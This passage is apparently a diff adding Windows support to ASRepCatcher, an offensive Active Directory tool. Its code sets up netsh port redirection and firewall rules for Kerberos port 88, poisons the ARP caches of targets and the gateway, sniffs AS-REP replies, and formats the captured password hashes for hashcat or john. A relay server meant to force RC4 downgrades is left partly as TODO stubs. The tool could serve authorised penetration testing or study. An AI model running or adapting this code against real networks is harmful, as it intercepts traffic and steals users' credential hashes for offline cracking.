+                               f'listenport=88', 'listenaddress=0.0.0.0', 
+                               f'connectport={relay_port}', 'connectaddress=127.0.0.1'], 
+                               capture_output=True, text=True, check=True, timeout=15)
+        
+        if result.returncode == 0:
+            rich_print_success(f'[RELAY] Successfully redirected port 88 to {relay_port}')
+            logging.debug(f'[*] Windows port redirection: 88 -> {relay_port}')
+            
+            # Add firewall rule for the alternative port
+            try:
+                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule', 
+                              f'name=ASRepCatcher_Kerberos_{relay_port}', 'dir=in', 'action=allow', 
+                              f'protocol=TCP', f'localport={relay_port}'], 
+                              capture_output=True, text=True, timeout=10)
+                logging.debug(f'[*] Added firewall rule for port {relay_port}')
+            except Exception as fw_e:
+                rich_print_warning(f'[RELAY] Could not add firewall rule for port {relay_port}: {fw_e}')
+        else:
+            rich_print_error(f'[RELAY] Failed to set up port redirection: {result.stderr}')
+            logging.error(f'[!] netsh portproxy failed: {result.stderr}')
+            
+    except Exception as e:
+        rich_print_error(f'[RELAY] Could not set up alternative port redirection: {e}')
+        rich_print_info('[RELAY] Note: Traffic redirection may not work without proper setup')
+
+def setup_traffic_redirection(interface_name):
+    """Set up Windows traffic redirection for Kerberos packets."""
+    try:
+        # First, check if portproxy service is available
+        check_result = subprocess.run(['netsh', 'interface', 'portproxy', 'show', 'all'], 
+                                    capture_output=True, text=True, check=True, timeout=10)
+        
+        # Clear any existing portproxy rules for port 88
+        try:
+            subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
+                          'listenport=88', 'listenaddress=0.0.0.0'], 
+                          capture_output=True, text=True, timeout=10)
+        except:
+            pass  # Ignore if rule doesn't exist
+        
+        # Set up Windows port redirection for Kerberos
+        # Note: This redirects external traffic to localhost - you may need WinDivert for more advanced scenarios
+        result = subprocess.run(['netsh', 'interface', 'portproxy', 'add', 'v4tov4', 
+                               'listenport=88', 'listenaddress=0.0.0.0', 
+                               'connectport=88', 'connectaddress=127.0.0.1'], 
+                               capture_output=True, text=True, check=True, timeout=15)
+        
+        if result.returncode == 0:
+            logging.debug('[*] Set up Windows port redirection for Kerberos')
+            
+            # Also try to configure Windows Firewall to allow the redirection
+            try:
+                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule', 
+                              'name=ASRepCatcher_Kerberos', 'dir=in', 'action=allow', 
+                              'protocol=TCP', 'localport=88'], 
+                              capture_output=True, text=True, timeout=10)
+                logging.debug('[*] Added Windows Firewall rule for Kerberos')
+            except Exception as fw_e:
+                logging.warning(f'[!] Could not add firewall rule (may need manual configuration): {fw_e}')
+        else:
+            raise Exception(f"Port proxy setup failed with return code {result.returncode}: {result.stderr}")
+            
+    except Exception as e:
+        logging.error(f'[!] Could not set up Windows port redirection: {e}')
+        logging.info('[*] Note: For advanced traffic redirection on Windows, consider using WinDivert or similar tools')
+        logging.info('[*] Alternative: Run the tool on the target machine or use network-level redirection')
+
+def restore_firewall_rules(backup_file):
+    """Restore Windows Firewall rules from backup."""
+    if not backup_file:
+        return
+        
+    try:
+        # Clean up port redirection first
+        subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
+                      'listenport=88', 'listenaddress=0.0.0.0'], 
+                      capture_output=True, text=True, timeout=10)
+        
+        # Check if this is a real backup file or just a marker
+        if backup_file.endswith('_no_firewall_backup.txt'):
+            logging.info('[*] No firewall backup to restore - cleaning up marker file')
+            try:
+                os.remove(backup_file)
+            except:
+                pass
+            return
+            
+        if backup_file.endswith('_firewall_state.txt'):
+            logging.info('[*] State-only backup detected - no automatic restore possible')
+            logging.info('[*] Please check firewall rules manually if needed')
+            try:
+                os.remove(backup_file)
+            except:
+                pass
+            return
+        
+        # Try to import the backup if it's a real .wfw file
+        if backup_file.endswith('.wfw'):
+            result = subprocess.run(['netsh', 'advfirewall', 'import', backup_file], 
+                                  capture_output=True, text=True, timeout=15)
+            
+            if result.returncode == 0:
+                logging.info("[*] Restored Windows Firewall rules")
+            else:
+                logging.warning(f'[!] Could not restore firewall rules: {result.stderr}')
+                logging.info('[*] Please check firewall rules manually')
+            
+            # Clean up backup file
+            try:
+                os.remove(backup_file)
+            except:
+                pass
+        else:
+            logging.info('[*] Unknown backup file format - no restore attempted')
+            
+    except Exception as e:
+        logging.error(f'[!] Could not restore Windows Firewall: {e}')
+        logging.info('[*] Please check firewall rules manually')
+
+# ============================================================================
+# ARP SPOOFING FUNCTIONS
+# ============================================================================
+
+def get_mac_addresses(ip_list):
+    # Check for interruption before ARP scan
+    if stop_arp_spoofing_flag.is_set():
+        return {}
+    
+    mac_addresses = {}
+    try:
+        ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_list),timeout=1,verbose=False, iface=iface, retry=1)
+        for i in ans :
+            mac_addresses[i[1].psrc] = i[1].hwsrc
+    except Exception as e:
+        pass
+    
+    return(mac_addresses)
+
+def relaymode_arp_spoof(spoofed_ip):
+    global Targets
+    # mac_addresses = update_uphosts()
+    mac_addresses = get_mac_addresses(TargetsList)
+    timer = 0
+    
+    rich_print_info(f'[ARP RELAY] Starting relay mode ARP spoofing for {len(mac_addresses)} targets', 'yellow')
+    rich_print_info(f'[ARP RELAY] Spoofed IP: {spoofed_ip}, Interface: {iface}, Source MAC: {hwsrc}', 'yellow')
+    
+    while not stop_arp_spoofing_flag.is_set() :
+        if Targets != set() :
+            packets_list = []
+            for target in mac_addresses :
+                # Check stop flag during packet building
+                if stop_arp_spoofing_flag.is_set():
+                    return
+                
+                # Build ARP reply packet: Tell target that spoofed_ip is at our MAC
+                packet = Ether(src=hwsrc, dst=mac_addresses[target]) / ARP(op=2, hwsrc=hwsrc, psrc=spoofed_ip, hwdst=mac_addresses[target], pdst=target)
+                packets_list.append(packet)
+                
+                # Verbose output for ARP spoofing
+                if debug or True:  # Always show ARP spoofing activity
+                    rich_print_info(f'[ARP RELAY] Spoofing {target} ({mac_addresses[target]}): telling them {spoofed_ip} is at {hwsrc}', 'yellow')
+            
+            if packets_list:
+                # Debug packet construction for relay mode
+                if debug:
+                    for i, pkt in enumerate(packets_list):
+                        rich_print_info(f'[ARP DEBUG] Relay packet {i+1}: {pkt.summary()}', 'cyan')
+                    rich_print_info(f'[ARP DEBUG] Sending {len(packets_list)} packets on interface: {iface}', 'cyan')
+                
+                rich_print_info(f'[ARP RELAY] Sending {len(packets_list)} ARP spoof packets', 'yellow')
+                sendp(packets_list, iface=iface, verbose=False)
+                rich_print_info(f'[ARP RELAY] Successfully sent {len(packets_list)} packets', 'green')
+            else:
+                rich_print_warning('[ARP RELAY] No packets to send - target list empty')
+        else:
+            rich_print_warning('[ARP RELAY] No active targets for ARP spoofing')
+        
+        # Use shorter sleep and check stop flag more frequently
+        for _ in range(10):  # Check stop flag every 0.1 seconds instead of waiting 1 full second
+            if stop_arp_spoofing_flag.is_set():
+                rich_print_info('[ARP RELAY] Stop flag detected, exiting ARP spoof thread', 'red')
+                return
+            time.sleep(0.1)
+            
+        timer += 1
+        if timer == 3 :
+            rich_print_info('[ARP RELAY] Updating target host list...', 'blue')
+            mac_addresses = update_uphosts()
+            timer = 0
+
+def listenmode_arp_spoof():
+    # CRITICAL: Use EXACT same method as working Linux version!
+    # In listen mode, poison GATEWAY's ARP cache with ALL targets at once
+    rich_print_info(f'[ARP LISTEN] LINUX METHOD: Batch gateway ARP poisoning', 'red')
+    rich_print_info(f'[ARP LISTEN] Targets: {list(Targets)} ({len(Targets)} hosts)', 'yellow')
+    rich_print_info(f'[ARP LISTEN] Gateway: {gw}, Interface: {iface}', 'yellow')
+    
+    try:
+        gateway_mac = getmacbyip(gw)
+        if not gateway_mac:
+            rich_print_error(f'[ARP LISTEN] Cannot get gateway MAC for {gw}')
+            return
+        rich_print_info(f'[ARP LISTEN] Gateway MAC: {gateway_mac}, Our MAC: {hwsrc}', 'cyan')
+    except Exception as e:
+        rich_print_error(f'[ARP LISTEN] Error: {e}')
+        return
+    
+    packet_count = 0
+    
+    try:
+        while not stop_arp_spoofing_flag.is_set():
+            if Targets != set():
+                try:
+                    # EXACT Linux method: Send single packet with ALL targets as sources
+                    # This tells gateway: "ALL these target IPs are at MY MAC address"
+                    # Original Linux code: sendp(Ether(src = hwsrc, dst=gateway_mac) / (ARP(op = 2, hwsrc = hwsrc, psrc = list(Targets))), iface=iface, verbose=False)
+                    arp_packet = Ether(src=hwsrc, dst=gateway_mac) / ARP(
+                        op=2,               # ARP Reply
+                        hwsrc=hwsrc,        # Our MAC address
+                        psrc=list(Targets)  # CRITICAL: ALL target IPs at once (Linux method)
+                    )
+                    
+                    sendp(arp_packet, iface=iface, verbose=False)
+                    packet_count += 1
+                    
+                    if packet_count % 10 == 0:
+                        rich_print_success(f'[ARP LISTEN] ✓ Linux method: {packet_count} batch ARP packets sent')
+                        rich_print_info(f'[ARP LISTEN] ✓ Told gateway: {len(Targets)} targets are at {hwsrc}', 'green')
+                        add_debug_message(f"Batch ARP #{packet_count}: {len(Targets)} targets -> gateway")
+                    
+                except Exception as e:
+                    rich_print_error(f'[ARP LISTEN] Error with Linux ARP method: {e}')
+                    
+            # Check for stop flag more frequently - break sleep into smaller chunks
+            for i in range(10):  # 10 x 0.1 second = 1 second total
+                if stop_arp_spoofing_flag.is_set():
+                    break
+                time.sleep(0.1)
+                
+    except KeyboardInterrupt:
+        rich_print_info('[ARP LISTEN] ARP spoofing interrupted by user', 'yellow')
+        stop_arp_spoofing_flag.set()
+    except Exception as e:
+        rich_print_error(f'[ARP LISTEN] Unexpected error in ARP spoofing: {e}')
+        stop_arp_spoofing_flag.set()
+    finally:
+        rich_print_info(f'[ARP LISTEN] ARP spoofing stopped after {packet_count} packets', 'cyan')
+
+def restore(poisoned_device, spoofed_ip):
+    packet = ARP(op = 2, pdst = poisoned_device, psrc = spoofed_ip, hwsrc = getmacbyip(spoofed_ip)) 
+    send(packet, verbose = False, count=1)
+
+def restore_listenmode(dic_mac_addresses):
+    packets_list = []
+    gateway_mac = getmacbyip(gw)
+    for ip_address in dic_mac_addresses :
+        packets_list.append(Ether(src = hwsrc, dst=gateway_mac) / ARP(op = 2, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]))
+    sendp(packets_list, iface=iface, verbose = False)
+
+def restore_relaymode(dic_mac_addresses):
+    packets_list = []
+    gateway_mac = getmacbyip(gw)
+    for target in dic_mac_addresses :
+        packets_list.append(Ether(src = hwsrc, dst=dic_mac_addresses[target]) / ARP(op = 2, psrc = gw, hwsrc = gateway_mac))
+    sendp(packets_list, iface=iface, verbose = False)
+
+def update_uphosts():
+    global Targets
+    mac_addresses = get_mac_addresses(list(InitialTargets))
+    new_hosts = set(mac_addresses.keys()) - Targets
+    old_hosts = Targets - set(mac_addresses.keys())
+    if len(old_hosts) > 0 : 
+        logging.debug(f'[*] Net probe check, removing down hosts from targets : {list(old_hosts)}')
+        Targets.difference_update(old_hosts)
+    if len(new_hosts) > 0 :
+        logging.debug(f'[*] Net probe check, adding new hosts to targets : {list(new_hosts)}')
+        Targets.update(new_hosts)
+    if len(new_hosts) > 0 or len(old_hosts) > 0 :
+        logging.debug(f'[*] Net probe check, updated targets list : {list(Targets)}')
+        if Targets == set() : logging.warning(f'[!] No more target is up. Continuing probing targets...')
+    return mac_addresses
+
+def restore_all_targets():
+    if mode == 'relay':
+        restore_relaymode(get_mac_addresses(list(Targets)))
+    elif mode == 'listen':
+        restore_listenmode(get_mac_addresses(list(Targets)))
+
+# ============================================================================
+# KERBEROS PROCESSING FUNCTIONS
+# ============================================================================
+
+def print_asrep_hash(username,domain,etype,cipher):
+    if HashFormat == 'hashcat':
+        if etype == 17 or etype == 18 :
+            HashToCrack = f'$krb5asrep${etype}${username}${domain}${cipher[-24:]}${cipher[:-24]}'
+        else :
+            HashToCrack = f'$krb5asrep${etype}${username}@{domain}:{cipher[:32]}${cipher[32:]}'
+    else :
+        if etype == 17 or etype == 18 :
+            HashToCrack = f'$krb5asrep${etype}${domain}{username}${cipher[:-24]}${cipher[-24:]}'
+        else :
+            HashToCrack = f'$krb5asrep${username}@{domain}:{cipher[:32]}${cipher[32:]}'
+    
+    # Use Rich formatting for hash display
+    rich_print_hash(username, domain, etype, HashToCrack)
+    
+    if etype == 17 and HashFormat == 'hashcat' :
+        rich_print_info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32100')
+    if etype == 18 and HashFormat == 'hashcat' :
+        rich_print_info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32200')
+    with open(outfile, 'a') as f:
+        f.write(HashToCrack + '\n')
+
+# handle_as_rep function removed - was using packet.root which doesn't exist
+
+def parse_dc_response(packet):
+    """
+    LINUX-COMPATIBLE VERSION: Copy exact parsing logic from working Linux version
+    Enhanced with TCP session support for Windows packet reassembly
+    """
+    global UsernamesSeen, UsernamesCaptured, Targets, InitialTargets
+    
+    try:
+        # LINUX METHOD: Check for TGS-REP first (exactly like Linux version)
+        if packet.haslayer(KRB_TGS_REP):
+            try:
+                decoder.start(bytes(packet.root.cname.nameString[0]))
+                username = decoder.read()[1].decode().lower()
+                decoder.start(bytes(packet.root.crealm))
+                domain = decoder.read()[1].decode().lower()
+                if username not in UsernamesSeen and username not in UsernamesCaptured:
+                    if username.endswith('$'):
+                        rich_print_info(f'[+] Sniffed TGS-REP for user {username}@{domain}', 'cyan')
+                    else:
+                        rich_print_info(f'[+] Sniffed TGS-REP for user {username}@{domain}', 'green')
+                    UsernamesSeen.add(username)
+                    add_debug_message(f"TGS-REP: {username}@{domain}")
+                    return
+            except Exception as e:
+                rich_print_warning(f'[TGS-REP] Parsing failed: {e}')
+                if debug:
+                    add_debug_message(f"TGS-REP parse error: {e}")
+
+        # LINUX METHOD: Check for AS-REP (exactly like Linux version) 
+        if not packet.haslayer(KRB_AS_REP):
+            return
+
+        # LINUX METHOD: Parse AS-REP using exact Linux approach
+        try:
+            decoder.start(bytes(packet.root.cname.nameString[0]))
+            username = decoder.read()[1].decode().lower()
+            decoder.start(bytes(packet.root.crealm))
+            domain = decoder.read()[1].decode().lower()
+            
+            rich_print_info(f'[+] Got ASREP for username: {username}@{domain}', 'green')
+            add_debug_message(f"AS-REP captured: {username}@{domain}")
+            
+            if username.endswith('$'):
+                rich_print_info(f'[*] Machine account: {username}, skipping...', 'yellow')
+                return
+                
+            decoder.start(bytes(packet.root.encPart.etype))
+            etype = decoder.read()[1]
+            decoder.start(bytes(packet.root.encPart.cipher))
+            cipher = decoder.read()[1].hex()
+            
+            if username in UsernamesCaptured and etype in UsernamesCaptured[username]:
+                rich_print_info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...', 'yellow')
+                return
+            else:
+                if username in UsernamesCaptured:
+                    UsernamesCaptured[username].append(etype)
+                else:
+                    UsernamesCaptured[username] = [etype]
+            
+            print_asrep_hash(username, domain, etype, cipher)
+            
+            if mode == 'listen' and stop_spoofing and not disable_spoofing:
+                try:
+                    Targets.remove(packet[IP].dst)
+                    InitialTargets.remove(packet[IP].dst)
+                    restore(gw, packet[IP].dst)
+                    rich_print_info(f'[+] Restored arp cache of {packet[IP].dst}', 'green')
+                except (KeyError, ValueError):
+                    pass  # Target already removed or not in list
+                    
+        except Exception as e:
+            rich_print_error(f'[AS-REP] Linux-method parsing failed: {e}')
+            if debug:
+                import traceback
+                rich_print_error(f'[AS-REP] Traceback: {traceback.format_exc()}')
+                add_debug_message(f"AS-REP parse error: {e}")
+            
+            # FALLBACK: Try manual parsing if Linux method fails
+            try:
+                if packet.haslayer(Raw) and len(packet[Raw].load) > 0:
+                    kerberos_data = bytes(packet[Raw].load)
+                    if b'\x6b' in kerberos_data[:20]:  # AS-REP tag
+                        rich_print_warning('[FALLBACK] Attempting manual AS-REP parsing')
+                        handle_as_rep_fallback(kerberos_data)
+            except Exception as fallback_e:
+                rich_print_error(f'[FALLBACK] Manual parsing also failed: {fallback_e}')
+                
+    except Exception as e:
+        rich_print_error(f'[ERROR] Exception in parse_dc_response: {e}')
+        if debug:
+            import traceback
+            rich_print_error(f'[ERROR] Traceback: {traceback.format_exc()}')
+            add_debug_message(f"parse_dc_response error: {e}")
+
+
+
+# handle_as_rep_original function removed - was using packet.root which doesn't exist
+
+def handle_as_rep_fallback(kerberos_data):
+    """Fallback AS-REP handling with basic ASN.1 parsing"""
+    global UsernamesCaptured
+    try:
+        # This is a very basic fallback - you might need to implement proper ASN.1 parsing
+        rich_print_info('[KERBEROS] Using fallback AS-REP parser', 'yellow')
+        
+        # Try to use the decoder if available
+        if 'decoder' in globals():
+            decoder.start(kerberos_data)
+            # Basic attempt to parse - this may not work perfectly
+            try:
+                # This is simplified and may need adjustment based on actual packet structure
+                parsed = decoder.read()
+                rich_print_info(f'[KERBEROS] Parsed ASN.1 structure: {type(parsed)}', 'cyan')
+                # Add more parsing logic here as needed
+            except Exception as asn1_e:
+                rich_print_warning(f'[KERBEROS] ASN.1 parsing failed: {asn1_e}')
+        
+        # For now, just log that we detected an AS-REP
+        rich_print_success('[KERBEROS] AS-REP detected but full parsing not yet implemented')
+        
+    except Exception as e:
+        rich_print_error(f'[KERBEROS] Fallback AS-REP parsing failed: {e}')
+
+def handle_tgs_rep_fallback(kerberos_data):
+    """Fallback TGS-REP handling"""
+    global UsernamesSeen
+    try:
+        rich_print_info('[KERBEROS] TGS-REP detected - username discovery mode', 'yellow')
+        # For now, just log that we detected a TGS-REP
+        # You can implement username extraction here
+        rich_print_success('[KERBEROS] TGS-REP detected but full parsing not yet implemented')
+    except Exception as e:
+        rich_print_error(f'[KERBEROS] TGS-REP parsing failed: {e}')
+
+# ============================================================================
+# ASYNC RELAY FUNCTIONS
+# ============================================================================
+
+async def handle_client(reader, writer):
+    """Handle incoming client connections for relay mode"""
+    client_ip = writer.get_extra_info('peername')[0]
+    rich_print_info(f'[RELAY] New connection from {client_ip}', 'cyan')
+    add_debug_message(f"Client connected: {client_ip}")
+
+    try:
+        while True:
+            data = await reader.read(2048)
+            if not data:
+                rich_print_info(f'[RELAY] Connection closed by {client_ip}', 'blue')
+                break
+
+            dc_response = await relay_to_dc(data, client_ip)
+            if dc_response:
+                writer.write(dc_response)
+                await writer.drain()
+            
+    except ConnectionResetError:
+        rich_print_info(f'[RELAY] Connection reset by {client_ip}', 'blue')
+    except Exception as e:
+        rich_print_error(f'[RELAY] Socket error from {client_ip}: {e}')
+
+    finally:
+        try:
+            writer.close()
+            await writer.wait_closed()
+        except Exception:
+            pass  # Connection already closed
+
+async def relay_without_modification_to_dc(data):
+    """Relay data to DC without modification"""
+    try:
+        reader, writer = await asyncio.open_connection(dc, 88)
+        writer.write(data)
+        await writer.drain()
+        
+        try:
+            response = await asyncio.wait_for(reader.read(2048), timeout=2)
+        except asyncio.TimeoutError:
+            # DC just sent an ACK, no response data
+            response = b""
+        
+        writer.close()
+        await writer.wait_closed()
+        return response
+    except Exception as e:
+        rich_print_error(f'[RELAY] Error connecting to DC: {e}')
+        return b""
+
+async def relay_tgsreq_to_dc(data):
+    """Handle TGS-REQ (Ticket Granting Service Request) to DC"""
+    global UsernamesSeen
+    response = await relay_without_modification_to_dc(data)
+    
+    # Simplified - just relay without complex parsing since we need real Kerberos layers
+    if KERBEROS_LAYERS_AVAILABLE:
+        try:
+            kerberos_packet = KerberosTCPHeader(response)
+            if not kerberos_packet.haslayer(KRB_TGS_REP):
+                return response
+                
+            # Extract username from TGS-REP for tracking (simplified)
+            rich_print_info('[TGS-REP] TGS-REP response detected in relay mode', 'green')
+            add_debug_message("TGS-REP detected in relay")
+            # TODO: Implement proper ASN.1 parsing for username extraction
+                    
+        except Exception as e:
+            rich_print_error(f'[TGS-REP] Error processing response: {e}')
+    else:
+        rich_print_warning('[TGS-REP] Kerberos layers not available - cannot parse TGS-REP')
+    
+    return response
+
+async def relay_asreq_to_dc(data, client_ip):
+    """Handle AS-REQ (Authentication Service Request) - Core of relay mode"""
+    global UsernamesCaptured, Targets, InitialTargets
+    
+    try:
+        kerberos_packet = KerberosTCPHeader(data)
+        
+        # Extract username and domain from AS-REQ (simplified)
+        username = "unknown"
+        domain = "unknown"
+        
+        # TODO: Implement proper ASN.1 parsing for AS-REQ
+        rich_print_info(f'[AS-REQ] Request from {client_ip} (parsing not yet implemented)', 'yellow')
+        add_debug_message(f"AS-REQ: {client_ip}")
+
+        # Skip computer accounts
+        if username.endswith('$'):
+            rich_print_info(f'[AS-REQ] Computer account {username}@{domain}, relaying without modification', 'blue')
+            return await relay_without_modification_to_dc(data)
+
+        # Skip if we already have RC4 hash for this user
+        if username in UsernamesCaptured and 23 in UsernamesCaptured[username]:
+            rich_print_info(f'[AS-REQ] RC4 hash already captured for {username}@{domain}, relaying', 'blue')
+            return await relay_without_modification_to_dc(data)
+
+        # Check if client supports RC4 and doesn't have pre-auth (simplified)
+        # TODO: Implement proper ASN.1 parsing for pre-auth and etype detection
+        has_preauth = False  # Simplified assumption
+        
+        if not has_preauth:
+            rich_print_info(f'[AS-REQ] {username}@{domain} without pre-auth, attempting downgrade', 'green')
+            
+            # Send request to DC and check for pre-auth required error
+            response = await relay_without_modification_to_dc(data)
+            krb_response = KerberosTCPHeader(response)
+            
+            # Check if DC responds with KRB_ERROR indicating pre-auth required
+            if krb_response.haslayer(KRB_ERROR):
+                rich_print_info(f'[AS-REQ] Pre-auth required error received, attempting RC4 downgrade', 'yellow')
+                
+                # TODO: Implement proper ASN.1 manipulation for RC4 downgrade
+                rich_print_warning('[AS-REQ] RC4 downgrade manipulation not yet implemented')
+                return response
+            else:
+                return response
+        else:
+            # Has pre-auth, relay normally and look for AS-REP
+            response = await relay_without_modification_to_dc(data)
+            krb_response = KerberosTCPHeader(response)
+            
+            if krb_response.haslayer(KRB_AS_REP):
+                rich_print_success(f'[AS-REP] Captured response for {username}@{domain}!')
+                add_debug_message(f"AS-REP CAPTURED: {username}@{domain}")
+                # TODO: Implement proper AS-REP parsing without packet.root
+                rich_print_info('[AS-REP] AS-REP detected in relay mode - parsing to be implemented', 'yellow')
+                
+                # Stop spoofing this target if configured
+                if stop_spoofing and not disable_spoofing:
+                    if client_ip in Targets:
+                        Targets.remove(client_ip)
+                    if client_ip in InitialTargets:
+                        InitialTargets.remove(client_ip)
+                    restore(client_ip, gw)
+                    rich_print_info(f'[AS-REP] Restored ARP cache for {client_ip}', 'green')
+            
+            return response
+            
+    except Exception as e:
+        rich_print_error(f'[AS-REQ] Error processing request from {client_ip}: {e}')
+        # Fallback to simple relay
+        return await relay_without_modification_to_dc(data)
+
+async def relay_to_dc(data, client_ip):
+    """Route Kerberos messages to appropriate relay handlers"""
+    if not KERBEROS_LAYERS_AVAILABLE:
+        rich_print_warning('[RELAY] Kerberos layers not available - simple relay only')
+        return await relay_without_modification_to_dc(data)
+    
+    try:
+        kerberos_packet = KerberosTCPHeader(data)
+
+        if kerberos_packet.haslayer(KRB_TGS_REQ):
+            rich_print_info(f'[RELAY] TGS-REQ from {client_ip}', 'cyan')
+            return await relay_tgsreq_to_dc(data)
+       
+        if kerberos_packet.haslayer(KRB_AS_REQ):
+            rich_print_info(f'[RELAY] AS-REQ from {client_ip}', 'cyan')
+            return await relay_asreq_to_dc(data, client_ip)
+        
+        rich_print_info(f'[RELAY] Unknown Kerberos message from {client_ip}', 'yellow')
+        return await relay_without_modification_to_dc(data)
+        
+    except Exception as e:
+        rich_print_error(f'[RELAY] Error processing data from {client_ip}: {e}')
+        return await relay_without_modification_to_dc(data)
+
+async def kerberos_server():
+    """Start the Kerberos relay server - with automatic port fallback"""
+    global relay_port, skip_redirection
+    
+    # Initialize server_port to None to ensure proper error handling
+    server_port = None
+    
+    try:
+        # First, clean up any existing port redirection to avoid conflicts
+        rich_print_info('[RELAY] Cleaning up any existing port 88 bindings...', 'yellow')
+        cleanup_traffic_redirection()
+        time.sleep(3)  # Give Windows more time to release the port
+        
+        # Additional cleanup - try to kill any processes using port 88 if possible
+        try:
+            result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
+            lines = result.stdout.split('\n')
+            port_88_lines = [line for line in lines if ':88 ' in line and 'LISTENING' in line]
+            if port_88_lines:
+                rich_print_warning('[RELAY] Port 88 is still in use after cleanup:')
+                for line in port_88_lines[:2]:
+                    rich_print_info(f'[RELAY] {line.strip()}', 'cyan')
+        except Exception:
+            pass
+        
+        # If user specified a non-standard port, use it directly
+        if relay_port != 88:
+            rich_print_info(f'[RELAY] Using user-specified port {relay_port}', 'cyan')
+            server_port = relay_port
+            
+            # Test the user-specified port with retry
+            for attempt in range(3):
+                try:
+                    test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    test_socket.bind(('0.0.0.0', server_port))
+                    test_socket.close()
+                    rich_print_success(f'[RELAY] User-specified port {server_port} is available')
+                    break
+                except OSError as e:
+                    try:
+                        test_socket.close()
+                    except:
+                        pass
+                    if attempt < 2:  # Not the last attempt
+                        rich_print_warning(f'[RELAY] Port {server_port} test failed (attempt {attempt+1}/3), retrying...')
+                        time.sleep(1)
+                    else:
+                        rich_print_error(f'[RELAY] User-specified port {server_port} is not available after 3 attempts: {e}')
+                        raise Exception(f"User-specified port {server_port} is not available")
+        else:
+            # FORCE ALTERNATIVE PORT - Don't even try 88 first to avoid the binding error
+            rich_print_warning('[RELAY] Forcing use of alternative port to avoid Windows port 88 conflicts')
+            rich_print_info('[RELAY] Testing alternative ports with automatic fallback...', 'cyan')
+            alternative_ports = [8088, 8888, 8889, 9088, 9889]  # Added more options
+            
+            # Skip port 88 entirely for now due to Windows conflicts
+            for attempt_port in alternative_ports:
+                rich_print_info(f'[RELAY] Testing alternative port {attempt_port}...', 'blue')
+                port_available = False
+                
+                # Multiple attempts per port
+                for attempt in range(2):
+                    try:
+                        # Test if port is available
+                        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                        test_socket.bind(('0.0.0.0', attempt_port))
+                        test_socket.close()
+                        
+                        server_port = attempt_port
+                        rich_print_success(f'[RELAY] ✓ Alternative port {server_port} is available for binding')
+                        port_available = True
+                        break
+                        
+                    except OSError as e:
+                        try:
+                            test_socket.close()
+                        except:
+                            pass
+                        
+                        if e.errno == 10048 or "already in use" in str(e).lower():
+                            if attempt == 0:
+                                rich_print_info(f'[RELAY] Port {attempt_port} busy, waiting 1s and retrying...', 'yellow')
+                                time.sleep(1)
+                            else:
+                                rich_print_warning(f'[RELAY] ✗ Port {attempt_port} is already in use after retry')
+                        else:
+                            rich_print_error(f'[RELAY] Unexpected error testing port {attempt_port}: {e}')
+                            break
+                
+                if port_available:
+                    break
+            
+            # Check if we found an available port
+            if server_port is None:
+                # No ports available
+                raise Exception(f"No available alternative ports for relay server (tried {', '.join(map(str, alternative_ports))})")
+            
+            rich_print_warning(f'[RELAY] Using alternative port {server_port} instead of port 88 to avoid conflicts')
+        
+        # Set up traffic redirection based on the port we're using (unless skipped)
+        if not skip_redirection:
+            if server_port == 88:
+                # Use standard setup for port 88
+                setup_traffic_redirection(iface)
+                rich_print_success('[RELAY] Using standard port 88 - traffic redirection configured')
+            else:
+                # Use alternative port setup
+                setup_traffic_redirection_alt(iface, server_port)
+                rich_print_success(f'[RELAY] Using alternative port {server_port} with traffic redirection from port 88')
+        else:
+            rich_print_warning('[RELAY] Skipping traffic redirection setup as requested')
+            rich_print_info('[RELAY] You will need to manually redirect traffic to this server', 'yellow')
+        
+        rich_print_info(f'[RELAY] Starting Kerberos relay server on port {server_port}...', 'green')
+        add_debug_message(f"Relay server starting on port {server_port}")
+        
+        # Start the actual server with additional error handling and retry
+        server_started = False
+        for start_attempt in range(3):
+            try:
+                server = await asyncio.start_server(handle_client, '0.0.0.0', server_port)
+                rich_print_success(f'[RELAY] ✓ Kerberos relay server started successfully on port {server_port}!')
+                
+                if server_port != 88 and not skip_redirection:
+                    rich_print_info(f'[RELAY] Traffic on port 88 will be redirected to our server on port {server_port}', 'cyan')
+                    rich_print_info('[RELAY] Clients will connect to port 88 but reach our relay server transparently', 'cyan')
+                
+                add_debug_message(f"Server ready on port {server_port}")
+                server_started = True
+                
+                async with server:
+                    await server.serve_forever()
+                break
+                    
+            except OSError as server_error:
+                if server_error.errno == 10048 or "already in use" in str(server_error).lower():
+                    if start_attempt < 2:  # Not the last attempt
+                        rich_print_warning(f'[RELAY] Server start failed on port {server_port} (attempt {start_attempt+1}/3): Port became busy')
+                        rich_print_info('[RELAY] Waiting 2 seconds and trying next available port...', 'yellow')
+                        time.sleep(2)
+                        
+                        # Try to find another port
+                        for next_port in [server_port + 1, server_port + 10, server_port + 100]:
+                            try:
+                                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                                test_socket.bind(('0.0.0.0', next_port))
+                                test_socket.close()
+                                server_port = next_port
+                                rich_print_info(f'[RELAY] Switched to port {server_port} for retry', 'cyan')
+                                break
+                            except:
+                                try:
+                                    test_socket.close()
+                                except:
+                                    pass
+                                continue
+                        continue
+                    else:
+                        rich_print_error(f'[RELAY] Failed to start server on port {server_port} after 3 attempts: Port is in use')
+                        rich_print_error(f'[RELAY] This suggests persistent port conflicts on Windows')
+                else:
+                    rich_print_error(f'[RELAY] Failed to start server on port {server_port}: {server_error}')
+                raise
+            
+    except Exception as e:
+        rich_print_error(f'[RELAY] Failed to start server: {e}')
+        # Additional diagnostics
+        rich_print_info('[RELAY] Attempting to diagnose port conflicts...', 'yellow')
+        try:
+            result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
+            lines = result.stdout.split('\n')
